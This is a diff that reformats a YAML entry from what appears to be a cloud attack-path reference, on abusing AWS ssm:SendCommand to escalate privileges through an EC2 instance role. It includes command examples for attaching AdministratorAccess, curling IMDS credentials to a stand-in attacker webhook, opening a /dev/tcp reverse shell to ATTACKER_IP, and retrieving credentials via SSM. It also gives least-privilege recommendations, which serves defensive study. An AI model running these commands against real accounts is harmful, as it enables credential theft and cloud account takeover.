@@ -33,19 +33,8 @@ exploitationSteps:
     command: aws ssm get-command-invocation --command-id @command-id --instance-id
       i-XXXXXXXXXXX
     description: Retrieve the command output containing the temporary credentials
-recommendation: 'Restrict access to `ssm:SendCommand` using the principle of least
-  privilege. Use the Resource and Condition elements in IAM policies to limit which
-  instances a principal can run commands on and which documents they can use. Monitor
-  use of this sensitive permission using CloudSIEM detections.
-
-  '
-limitations: 'This path provides administrative access only if the target resource''s
-  execution role has administrative permissions. The attacker gains whatever permissions
-  the resource''s role has. If the role has limited permissions, the attacker gains
-  limited access. However, even limited access may enable multi-hop attacks or access
-  to sensitive data.
-
-  '
+recommendation: 'Restrict access to `ssm:SendCommand` using the principle of least privilege. Use the Resource and Condition elements in IAM policies to limit which instances a principal can run commands on and which documents they can use. Monitor use of this sensitive permission using CloudSIEM detections.'
+limitations: 'This path provides administrative access only if the target resource''s execution role has administrative permissions. The attacker gains whatever permissions the resource''s role has. If the role has limited permissions, the attacker gains limited access. However, even limited access may enable multi-hop attacks or access to sensitive data.'
 discoveryAttribution:
   firstDocumented:
     author: Erik Steringer
@@ -126,80 +115,92 @@ attackVisualization:
     label: 'Method 1: Direct Elevation via AWS CLI'
     type: payload
     color: '#99ccff'
-    description: "Use ssm:SendCommand to execute AWS CLI commands on the instance\
-      \ that directly elevate the starting principal's permissions. The command runs\
-      \ with the instance role's credentials and can perform privileged IAM actions\
-      \ such as:\n- Attaching AdministratorAccess policy to the starting principal\
-      \ (iam:AttachUserPolicy)\n- Creating new access keys for privileged users (iam:CreateAccessKey)\n\
-      - Adding the starting principal to an admin IAM group (iam:AddUserToGroup)\n\
-      - Modifying inline policies to grant elevated permissions (iam:PutUserPolicy)\n\
-      \nExample SSM command that directly elevates starting principal:\n```bash\n\
-      aws ssm send-command \\\n  --instance-ids \"i-XXXXXXXXXXX\" \\\n  --document-name\
-      \ \"AWS-RunShellScript\" \\\n  --parameters commands=[\"aws iam attach-user-policy\
-      \ --user-name starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"\
-      ]\n```\n\nThis approach is the most direct - the command immediately grants\
-      \ the starting principal elevated permissions using the instance role's credentials.\
-      \ No credential exfiltration is needed.\n"
+    description: |
+      Use ssm:SendCommand to execute AWS CLI commands on the instance that directly elevate the starting principal's permissions. The command runs with the instance role's credentials and can perform privileged IAM actions such as:
+      - Attaching AdministratorAccess policy to the starting principal (iam:AttachUserPolicy)
+      - Creating new access keys for privileged users (iam:CreateAccessKey)
+      - Adding the starting principal to an admin IAM group (iam:AddUserToGroup)
+      - Modifying inline policies to grant elevated permissions (iam:PutUserPolicy)
+
+      Example SSM command that directly elevates starting principal:
+      ```bash
+      aws ssm send-command \
+        --instance-ids "i-XXXXXXXXXXX" \
+        --document-name "AWS-RunShellScript" \
+        --parameters commands=["aws iam attach-user-policy --user-name starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]
+      ```
+
+      This approach is the most direct - the command immediately grants the starting principal elevated permissions using the instance role's credentials. No credential exfiltration is needed.
   - id: method_credential_exfil
     label: 'Method 2: Exfiltrate Credentials to Remote Host'
     type: payload
     color: '#99ccff'
-    description: "Use ssm:SendCommand to execute a command that queries IMDS for the\
-      \ instance role's credentials and exfiltrates them to an attacker-controlled\
-      \ webhook or remote listener. This is a fire-and-forget approach that automatically\
-      \ retrieves and sends credentials without requiring the attacker to poll SSM\
-      \ for command output.\n\nExample SSM command that exfiltrates credentials:\n\
-      ```bash\naws ssm send-command \\\n  --instance-ids \"i-XXXXXXXXXXX\" \\\n  --document-name\
-      \ \"AWS-RunShellScript\" \\\n  --parameters commands=[\"ROLE_NAME=\\$(curl -s\
-      \ http://169.254.169.254/latest/meta-data/iam/security-credentials/); CREDS=\\\
-      $(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\\\
-      $ROLE_NAME); curl -X POST -d \\\"\\$CREDS\\\" https://attacker-webhook.com/collect\"\
-      ]\n```\n\nThe command automatically:\n1. Queries the metadata service to discover\
-      \ the attached role name\n2. Retrieves the full credential set (AccessKeyId,\
-      \ SecretAccessKey, SessionToken)\n3. Sends the credentials to an attacker-controlled\
-      \ endpoint (webhook, HTTP server, etc.)\n\nThe attacker receives the credentials\
-      \ remotely and can then configure them locally to authenticate as the instance\
-      \ role. This approach doesn't require ssm:GetCommandInvocation permission.\n"
+    description: |
+      Use ssm:SendCommand to execute a command that queries IMDS for the instance role's credentials and exfiltrates them to an attacker-controlled webhook or remote listener. This is a fire-and-forget approach that automatically retrieves and sends credentials without requiring the attacker to poll SSM for command output.
+
+      Example SSM command that exfiltrates credentials:
+      ```bash
+      aws ssm send-command \
+        --instance-ids "i-XXXXXXXXXXX" \
+        --document-name "AWS-RunShellScript" \
+        --parameters commands=["ROLE_NAME=\$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/); CREDS=\$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\$ROLE_NAME); curl -X POST -d \"\$CREDS\" https://attacker-webhook.com/collect"]
+      ```
+
+      The command automatically:
+      1. Queries the metadata service to discover the attached role name
+      2. Retrieves the full credential set (AccessKeyId, SecretAccessKey, SessionToken)
+      3. Sends the credentials to an attacker-controlled endpoint (webhook, HTTP server, etc.)
+
+      The attacker receives the credentials remotely and can then configure them locally to authenticate as the instance role. This approach doesn't require ssm:GetCommandInvocation permission.
   - id: method_reverse_shell
     label: 'Method 3: Reverse Shell Connection'
     type: payload
     color: '#99ccff'
-    description: "Use ssm:SendCommand to establish a reverse shell connection back\
-      \ to an attacker-controlled listener. The reverse shell provides interactive\
-      \ access to the EC2 instance, allowing the attacker to manually retrieve the\
-      \ instance role's temporary credentials from IMDS.\n\nExample SSM command that\
-      \ establishes reverse shell:\n```bash\naws ssm send-command \\\n  --instance-ids\
-      \ \"i-XXXXXXXXXXX\" \\\n  --document-name \"AWS-RunShellScript\" \\\n  --parameters\
-      \ commands=[\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"]\n```\n\nOnce the\
-      \ reverse shell is established, the attacker can:\n1. Query the instance metadata\
-      \ service: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`\n\
-      2. Extract temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)\n\
-      3. Configure these credentials locally: `aws configure set` or environment variables\n\
-      4. Use the credentials to perform actions as the instance role\n\nThe reverse\
-      \ shell approach requires the attacker to maintain a listener (e.g., `nc -lvnp\
-      \ 4444`) but provides interactive access and flexibility for manual reconnaissance\
-      \ and exploitation.\n"
+    description: |
+      Use ssm:SendCommand to establish a reverse shell connection back to an attacker-controlled listener. The reverse shell provides interactive access to the EC2 instance, allowing the attacker to manually retrieve the instance role's temporary credentials from IMDS.
+
+      Example SSM command that establishes reverse shell:
+      ```bash
+      aws ssm send-command \
+        --instance-ids "i-XXXXXXXXXXX" \
+        --document-name "AWS-RunShellScript" \
+        --parameters commands=["bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
+      ```
+
+      Once the reverse shell is established, the attacker can:
+      1. Query the instance metadata service: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`
+      2. Extract temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)
+      3. Configure these credentials locally: `aws configure set` or environment variables
+      4. Use the credentials to perform actions as the instance role
+
+      The reverse shell approach requires the attacker to maintain a listener (e.g., `nc -lvnp 4444`) but provides interactive access and flexibility for manual reconnaissance and exploitation.
   - id: method_ssm_retrieval
     label: 'Method 4: Print Credentials and Retrieve via SSM'
     type: payload
     color: '#99ccff'
-    description: "Use ssm:SendCommand to execute a command that queries IMDS and prints\
-      \ the credentials to stdout. The command output is captured by SSM and can be\
-      \ retrieved later using ssm:ListCommandInvocations and ssm:GetCommandInvocation.\
-      \ This is the most straightforward approach when you have the additional SSM\
-      \ permissions.\n\nExample SSM command that prints credentials:\n```bash\naws\
-      \ ssm send-command \\\n  --instance-ids \"i-XXXXXXXXXXX\" \\\n  --document-name\
-      \ \"AWS-RunShellScript\" \\\n  --parameters commands=[\"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\"\
-      ]\n```\n\nThen retrieve the command output:\n```bash\n# List command invocations\
-      \ to find the CommandId\naws ssm list-command-invocations --instance-id i-XXXXXXXXXXX\n\
-      \n# Get the specific command output containing credentials\naws ssm get-command-invocation\
-      \ --command-id <COMMAND_ID> --instance-id i-XXXXXXXXXXX\n```\n\nThe output contains\
-      \ the JSON response from IMDS with the instance role's temporary security credentials\
-      \ including AccessKeyId, SecretAccessKey, and SessionToken. The credentials\
-      \ can then be exported to environment variables and used with AWS CLI or SDK\
-      \ from any location.\n\nThis approach requires ssm:ListCommandInvocations and\
-      \ ssm:GetCommandInvocation permissions but is the cleanest method as all communication\
-      \ happens through AWS APIs without requiring external infrastructure.\n"
+    description: |
+      Use ssm:SendCommand to execute a command that queries IMDS and prints the credentials to stdout. The command output is captured by SSM and can be retrieved later using ssm:ListCommandInvocations and ssm:GetCommandInvocation. This is the most straightforward approach when you have the additional SSM permissions.
+
+      Example SSM command that prints credentials:
+      ```bash
+      aws ssm send-command \
+        --instance-ids "i-XXXXXXXXXXX" \
+        --document-name "AWS-RunShellScript" \
+        --parameters commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"]
+      ```
+
+      Then retrieve the command output:
+      ```bash
+      # List command invocations to find the CommandId
+      aws ssm list-command-invocations --instance-id i-XXXXXXXXXXX
+
+      # Get the specific command output containing credentials
+      aws ssm get-command-invocation --command-id <COMMAND_ID> --instance-id i-XXXXXXXXXXX
+      ```
+
+      The output contains the JSON response from IMDS with the instance role's temporary security credentials including AccessKeyId, SecretAccessKey, and SessionToken. The credentials can then be exported to environment variables and used with AWS CLI or SDK from any location.
+
+      This approach requires ssm:ListCommandInvocations and ssm:GetCommandInvocation permissions but is the cleanest method as all communication happens through AWS APIs without requiring external infrastructure.
   - id: admin_outcome
     label: Effective Administrator
     type: outcome
@@ -237,13 +238,16 @@ attackVisualization:
   - from: start
     to: ec2_instance
     label: ssm:SendCommand
-    description: "Use ssm:SendCommand to execute a command on the target EC2 instance.\
-      \ The command uses the AWS-RunShellScript document to execute arbitrary shell\
-      \ commands. Choose one of the four exploitation methods based on available permissions\
-      \ and operational security requirements.\n\nBasic command structure:\n```bash\n\
-      aws ssm send-command \\\n  --instance-ids \"i-XXXXXXXXXXX\" \\\n  --document-name\
-      \ \"AWS-RunShellScript\" \\\n  --parameters commands=[\"<EXPLOITATION_COMMAND>\"\
-      ]\n```\n"
+    description: |
+      Use ssm:SendCommand to execute a command on the target EC2 instance. The command uses the AWS-RunShellScript document to execute arbitrary shell commands. Choose one of the four exploitation methods based on available permissions and operational security requirements.
+
+      Basic command structure:
+      ```bash
+      aws ssm send-command \
+        --instance-ids "i-XXXXXXXXXXX" \
+        --document-name "AWS-RunShellScript" \
+        --parameters commands=["<EXPLOITATION_COMMAND>"]
+      ```
   - from: ec2_instance
     to: instance_role
     label: Command executes on instance
